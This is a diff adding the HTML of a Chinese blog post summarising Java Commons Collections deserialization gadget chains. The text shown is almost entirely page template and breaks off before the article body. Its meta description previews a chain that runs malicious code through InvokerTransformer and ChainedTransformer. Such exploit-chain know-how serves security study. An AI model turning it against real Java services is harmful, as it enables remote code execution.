@@ -1,0 +1,1034 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta name="referrer" content="no-referrer">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="azraelxuemo">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="azraelxuemo">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="前言cc链在我理解可以分为两个部分  执行恶意代码部分 从readObject到执行恶意代码中间的链子  那么后面的具体每一个cc链分析多为链子部分，执行恶意代码先放在前面介绍 执行恶意代码任意方法调用InvokerTransformer+ChainedTransformer123456ConstantTransformer constantTransformer&#x3D;new ConstantTran">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CC链汇总">
+<meta property="og:url" content="https://azraelxuemo.github.io/2023/11/19/CC%E9%93%BE/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言cc链在我理解可以分为两个部分  执行恶意代码部分 从readObject到执行恶意代码中间的链子  那么后面的具体每一个cc链分析多为链子部分，执行恶意代码先放在前面介绍 执行恶意代码任意方法调用InvokerTransformer+ChainedTransformer123456ConstantTransformer constantTransformer&#x3D;new ConstantTran">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698975470562-8b229f49-13fb-4736-9572-62b9c91a4deb.png#averageHue=%23f8f8f8&clientId=u923e8ca8-dbd9-4&from=drop&id=u05f4048f&originHeight=428&originWidth=1460&originalType=binary&ratio=2&rotation=0&showTitle=false&size=376466&status=done&style=none&taskId=udd9e86b5-3fb0-4ee1-acf8-60314ab18b4&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699020093605-0d426d8e-e3b5-49f2-be6e-3dc78ca6e92b.png#averageHue=%2325272a&clientId=uc8f9044e-263b-4&from=drop&id=u7374094e&originHeight=614&originWidth=936&originalType=binary&ratio=2&rotation=0&showTitle=false&size=358208&status=done&style=none&taskId=u9deb2a80-303a-4684-ab91-f0c8e1ac3c0&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698840362939-895724de-9dbb-4006-819c-bf4e43f75f34.png#averageHue=%2326282b&clientId=u00b9e088-0f93-4&from=drop&id=Mqti6&originHeight=534&originWidth=1302&originalType=binary&ratio=2&rotation=0&showTitle=false&size=437166&status=done&style=none&taskId=u74106f30-ec7f-4263-9b5a-9cc7782c623&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699057676589-aee51a03-ed5f-40fd-9217-59adadc2369d.png#averageHue=%23232528&clientId=uc8f9044e-263b-4&from=drop&id=AkFUn&originHeight=154&originWidth=626&originalType=binary&ratio=2&rotation=0&showTitle=false&size=68174&status=done&style=none&taskId=ucd29555b-a832-41b3-b427-07c5bda9296&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698931538895-fd3432ba-5992-44cb-963c-1ffdf6b6805e.png#averageHue=%2326272a&clientId=u2947e948-9e44-4&from=drop&id=Bk34R&originHeight=760&originWidth=1222&originalType=binary&ratio=2&rotation=0&showTitle=false&size=581767&status=done&style=none&taskId=u70bec353-4072-42ce-b312-2318ff1cf07&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699068169757-34ffb153-648b-46a9-acf4-e6aee2e7166c.png#averageHue=%2324262b&clientId=uc8f9044e-263b-4&from=drop&id=u12b7d1a3&originHeight=470&originWidth=1144&originalType=binary&ratio=2&rotation=0&showTitle=false&size=309349&status=done&style=none&taskId=u9fa491a5-ede5-426e-928a-2731d79c9db&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698841805764-590884ab-de54-4ad1-b9cf-9a45d0a30623.png#averageHue=%2327282c&clientId=u00b9e088-0f93-4&from=drop&id=zgz24&originHeight=400&originWidth=1268&originalType=binary&ratio=2&rotation=0&showTitle=false&size=332768&status=done&style=none&taskId=ud5718abb-fd01-43a5-8a89-4119d43a629&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698841925903-effc1018-5669-417e-82f7-f09bc2b78643.png#averageHue=%23252629&clientId=u00b9e088-0f93-4&from=drop&id=SnES4&originHeight=468&originWidth=1574&originalType=binary&ratio=2&rotation=0&showTitle=false&size=455198&status=done&style=none&taskId=ue6ae9679-d3d7-469b-b53e-2cf91dc00e5&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699272886359-6f2cd000-1d1c-4047-9efb-f5d974e067e2.png#averageHue=%23282a2e&clientId=u574e201a-7720-4&from=drop&id=uf0142383&originHeight=150&originWidth=680&originalType=binary&ratio=2&rotation=0&showTitle=false&size=75902&status=done&style=none&taskId=u63e6dba0-ae65-4d8c-9339-dd9fb88f0ad&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699272903445-ea55bf59-7f7c-416d-b4fb-ea6ea858354d.png#averageHue=%23272c36&clientId=u574e201a-7720-4&from=drop&id=u84520a43&originHeight=338&originWidth=956&originalType=binary&ratio=2&rotation=0&showTitle=false&size=205367&status=done&style=none&taskId=uda038f0b-9946-43f2-99cf-2d8f2c60754&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699272916198-b13b232c-4ff9-4ad7-b9c4-dccc9d36a370.png#averageHue=%2326272b&clientId=u574e201a-7720-4&from=drop&id=uf9c52f49&originHeight=282&originWidth=1408&originalType=binary&ratio=2&rotation=0&showTitle=false&size=264855&status=done&style=none&taskId=u82884ad4-a3f3-49dc-8c85-1f950606d04&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699068903273-997aa9cc-e1ad-48c8-a7ff-18ae7d0a695d.png#averageHue=%23f9f9f9&clientId=uc8f9044e-263b-4&from=drop&id=u49f2994e&originHeight=532&originWidth=1512&originalType=binary&ratio=2&rotation=0&showTitle=false&size=484200&status=done&style=none&taskId=u0db13354-677e-43c1-b737-ca366d84e4c&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698925152962-1952cb9a-14c4-4906-9e38-de96e34003a1.png#averageHue=%2325262b&clientId=u2947e948-9e44-4&from=drop&id=u9d14a8b4&originHeight=184&originWidth=690&originalType=binary&ratio=2&rotation=0&showTitle=false&size=105287&status=done&style=none&taskId=ubbb420df-938b-4087-ba3f-e87ba01f42b&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698925211627-d0c9cd22-130a-45db-b297-2eca3a003440.png#averageHue=%23232428&clientId=u2947e948-9e44-4&from=drop&id=u843766b6&originHeight=664&originWidth=1080&originalType=binary&ratio=2&rotation=0&showTitle=false&size=477545&status=done&style=none&taskId=u8823f924-65d5-4f38-85c4-32e5db2ad14&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698926560322-5d6f423a-d3e6-4389-bff3-469c3a31c5f1.png#averageHue=%23232428&clientId=u2947e948-9e44-4&from=drop&id=u79500752&originHeight=886&originWidth=1660&originalType=binary&ratio=2&rotation=0&showTitle=false&size=948376&status=done&style=none&taskId=u72340096-0cbb-48e0-8107-3ce89bfc465&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699080373877-b22b273a-3ce8-43e3-979e-576999bb41ff.png#averageHue=%23f9f9f9&clientId=uc8f9044e-263b-4&from=drop&id=u4f462f9f&originHeight=616&originWidth=1668&originalType=binary&ratio=2&rotation=0&showTitle=false&size=687881&status=done&style=none&taskId=ube172b8b-3b58-4644-937e-1ed51b70623&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699081422103-ea16a860-30a6-47cd-9b94-37f955dc1e60.png#averageHue=%23282b32&clientId=uc8f9044e-263b-4&from=drop&id=xLFAm&originHeight=664&originWidth=1330&originalType=binary&ratio=2&rotation=0&showTitle=false&size=626130&status=done&style=none&taskId=u0458b016-0231-45dc-95ee-f2497ddc8ff&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699082303041-1486e452-3d0a-43a3-9111-d22c74c6d7f4.png#averageHue=%23f8f8f8&clientId=uc8f9044e-263b-4&from=drop&id=nGWPh&originHeight=506&originWidth=1630&originalType=binary&ratio=2&rotation=0&showTitle=false&size=563489&status=done&style=none&taskId=ua12884ee-53d5-4b1b-9ad2-7f7a787b067&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698894530327-41ed4d54-d849-49be-904e-a5732b4c8057.png#averageHue=%2327292c&clientId=uf8396875-8680-4&from=drop&id=u09436655&originHeight=142&originWidth=1402&originalType=binary&ratio=2&rotation=0&showTitle=false&size=128101&status=done&style=none&taskId=uec11fc55-1ca5-4c61-b6ea-0579ff0c25f&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699082554025-fdeb2e48-de82-4be5-9a8a-0286800dea01.png#averageHue=%232a303e&clientId=uc8f9044e-263b-4&from=drop&id=Di3Bk&originHeight=158&originWidth=866&originalType=binary&ratio=2&rotation=0&showTitle=false&size=97753&status=done&style=none&taskId=ueaae89bb-0804-4f0b-8212-2103a579c6b&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698895809901-57ef400b-5e64-4146-82bc-f95e54f1d2cb.png#averageHue=%232a2d32&clientId=uf8396875-8680-4&from=drop&id=u26df5c55&originHeight=116&originWidth=944&originalType=binary&ratio=2&rotation=0&showTitle=false&size=85138&status=done&style=none&taskId=u83180752-df96-45a4-b37f-8ca2fcfd133&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698895727336-63b4d528-3085-4704-bedf-adb5fdd9437d.png#averageHue=%23252629&clientId=uf8396875-8680-4&from=drop&id=uab94f101&originHeight=362&originWidth=1100&originalType=binary&ratio=2&rotation=0&showTitle=false&size=253710&status=done&style=none&taskId=uc669b900-34e6-40ce-8246-e9e95609383&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698896134079-ffc2d204-18e0-422e-bfaf-3a2e2deba9db.png#averageHue=%2326282b&clientId=uf8396875-8680-4&from=drop&id=ucf8b0821&originHeight=274&originWidth=924&originalType=binary&ratio=2&rotation=0&showTitle=false&size=155638&status=done&style=none&taskId=uc91d3b9c-f792-4e32-b29d-7c56ee6d7ad&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699083751199-7541f09b-314c-4480-a88d-e150dd5ea74a.png#averageHue=%23f9f9f9&clientId=uc8f9044e-263b-4&from=drop&id=SNpa5&originHeight=582&originWidth=1690&originalType=binary&ratio=2&rotation=0&showTitle=false&size=660157&status=done&style=none&taskId=u6b539972-090a-4a9b-9cbe-6a2f48b3651&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699090084097-e007691a-768a-4d45-8ed4-1b570867fe7a.png#averageHue=%23f8f8f8&clientId=uc7c77b65-848a-4&from=drop&id=uae46c9a1&originHeight=540&originWidth=1672&originalType=binary&ratio=2&rotation=0&showTitle=false&size=619922&status=done&style=none&taskId=uda4f1c59-0b25-484b-adff-7e0a700ad6a&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699087298601-718021b0-636e-4ef2-80f8-8c63749e3c4b.png#averageHue=%2328292c&clientId=uc7c77b65-848a-4&from=drop&id=B6QIo&originHeight=656&originWidth=1084&originalType=binary&ratio=2&rotation=0&showTitle=false&size=481734&status=done&style=none&taskId=u03df3d5b-e819-4430-b3b3-fd3f01b0d06&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699087340800-86fb2175-fa5f-4293-91f7-b5de7fc15d7f.png#averageHue=%23272a30&clientId=uc7c77b65-848a-4&from=drop&id=u59b58d80&originHeight=562&originWidth=1164&originalType=binary&ratio=2&rotation=0&showTitle=false&size=418594&status=done&style=none&taskId=u3751caec-cd59-443b-a76a-7a83a42e0e9&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699087369837-674e24b7-6c50-4535-806f-00f75c566094.png#averageHue=%23292a2d&clientId=uc7c77b65-848a-4&from=drop&id=ucb134013&originHeight=174&originWidth=850&originalType=binary&ratio=2&rotation=0&showTitle=false&size=103128&status=done&style=none&taskId=u24070cf5-699e-450b-82e6-9ba734b2bc6&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699088139746-e7f46c68-abd0-4b7f-aeee-132471c194c1.png#averageHue=%2326292e&clientId=uc7c77b65-848a-4&from=drop&id=zzebZ&originHeight=1044&originWidth=1238&originalType=binary&ratio=2&rotation=0&showTitle=false&size=825064&status=done&style=none&taskId=u7ce3a6b2-40f1-44f3-984b-0263d21c93b&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699087581469-8d64e4f3-c211-41e5-87ac-b6bd9f3b7178.png#averageHue=%23282a2d&clientId=uc7c77b65-848a-4&from=drop&id=ucb5f1785&originHeight=506&originWidth=1170&originalType=binary&ratio=2&rotation=0&showTitle=false&size=391549&status=done&style=none&taskId=u32564a6d-b7d9-4adc-9cd1-8fc2282de9e&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699090232728-4a707ce9-d59b-46b4-a431-ca415c207426.png#averageHue=%23303540&clientId=uc7c77b65-848a-4&from=drop&id=ube18deea&originHeight=112&originWidth=982&originalType=binary&ratio=2&rotation=0&showTitle=false&size=94816&status=done&style=none&taskId=u61bb95ab-1be7-40bc-a237-90e763360c9&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699090272824-a9740e90-ee26-40f9-ac84-1b2a082eca41.png#averageHue=%2326272a&clientId=uc7c77b65-848a-4&from=drop&id=udac2f7ad&originHeight=306&originWidth=728&originalType=binary&ratio=2&rotation=0&showTitle=false&size=143989&status=done&style=none&taskId=u7886c154-27b6-44bb-a2a8-b55ea906f1c&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699090327502-2afa77a2-5329-457c-bab4-c005012836fe.png#averageHue=%2326282c&clientId=uc7c77b65-848a-4&from=drop&id=u7b7391ed&originHeight=1110&originWidth=1076&originalType=binary&ratio=2&rotation=0&showTitle=false&size=763636&status=done&style=none&taskId=u5598c823-dc3b-4d6a-9cd4-5009d4f0365&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699089552625-f36c652c-16ea-45a4-b847-a0ba756f8d57.png#averageHue=%2326282c&clientId=uc7c77b65-848a-4&from=drop&id=u563b4cf1&originHeight=278&originWidth=1020&originalType=binary&ratio=2&rotation=0&showTitle=false&size=178278&status=done&style=none&taskId=u2e4d5182-f639-4f22-9ad9-63e152183bc&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699084754874-c28a670e-7845-4980-bae0-804498b664fe.png#averageHue=%23393b3f&clientId=ua1e71ffd-7bfe-4&from=drop&id=u3e901ff0&originHeight=92&originWidth=558&originalType=binary&ratio=2&rotation=0&showTitle=false&size=45086&status=done&style=none&taskId=uf056eec8-f6d7-45b8-8250-3c3836dbacb&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699086637647-2a677356-41d7-47fd-8477-2dacabf1e8d0.png#averageHue=%23333539&clientId=ua1e71ffd-7bfe-4&from=drop&id=u7e083fd8&originHeight=68&originWidth=522&originalType=binary&ratio=2&rotation=0&showTitle=false&size=33573&status=done&style=none&taskId=uf2126a49-c023-4131-9bb7-e2315cf4652&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699358273737-12ee3838-aa72-43dc-b15c-ceab6f55090c.png#averageHue=%2326272a&clientId=u6e0b84fc-dbd1-4&from=drop&id=u2b98bc50&originHeight=410&originWidth=742&originalType=binary&ratio=2&rotation=0&showTitle=false&size=206923&status=done&style=none&taskId=ubf30ab29-48b2-4f47-8c35-b86c388b865&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699358356741-3552f518-6462-439f-8644-5a07b8c50f9f.png#averageHue=%2325262a&clientId=u6e0b84fc-dbd1-4&from=drop&id=ufee2fc7f&originHeight=408&originWidth=922&originalType=binary&ratio=2&rotation=0&showTitle=false&size=247631&status=done&style=none&taskId=u20e4711c-408e-4f9e-85dd-d43a39dcead&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699270229893-41cb28b4-907d-4404-a7b4-4b421a5c99b2.png#averageHue=%2327292f&clientId=u574e201a-7720-4&from=drop&id=uffcf26e1&originHeight=802&originWidth=1500&originalType=binary&ratio=2&rotation=0&showTitle=false&size=763404&status=done&style=none&taskId=uae50b5d0-ee73-40c6-9ab4-3ba1f37f307&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699270546718-323655e4-5a8c-478b-a9a4-dde3b0110434.png#averageHue=%232b2e33&clientId=u574e201a-7720-4&from=drop&id=u3db0e3f4&originHeight=1122&originWidth=1552&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1113958&status=done&style=none&taskId=u907c9613-e5a4-4473-ac69-0386d193ea0&title=">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699270622718-53b439b7-2827-49fa-8ad4-c2524a026c9a.png#averageHue=%23393d45&clientId=u574e201a-7720-4&from=drop&id=ucda1be62&originHeight=418&originWidth=776&originalType=binary&ratio=2&rotation=0&showTitle=false&size=238847&status=done&style=none&taskId=u2e048495-af0a-4bde-8f9c-64e603e232e&title=">
+<meta property="article:published_time" content="2023-11-19T02:51:34.000Z">
+<meta property="article:modified_time" content="2023-11-19T02:40:30.641Z">
+<meta property="article:author" content="azraelxuemo">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/29417415/1698975470562-8b229f49-13fb-4736-9572-62b9c91a4deb.png#averageHue=%23f8f8f8&clientId=u923e8ca8-dbd9-4&from=drop&id=u05f4048f&originHeight=428&originWidth=1460&originalType=binary&ratio=2&rotation=0&showTitle=false&size=376466&status=done&style=none&taskId=udd9e86b5-3fb0-4ee1-acf8-60314ab18b4&title=">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>CC链汇总 · azraelxuemo&#39;s Studio</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20211217" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20211217" as="style">
+    <link rel="stylesheet" href="/css/dark.css">
+    <link rel="stylesheet" href="/css/mobile.css?v=20211217" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20211217" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20211217" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- Google tag (gtag.js) -->
+    
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>azraelxuemo's Studio.</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">azraelxuemo&#39;s Studio.</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">CC链汇总</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                CC链汇总
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="java">java</a>
+    
+</div>
+
+                
+                <!-- 文章字数统计 -->
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2023/11/19</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
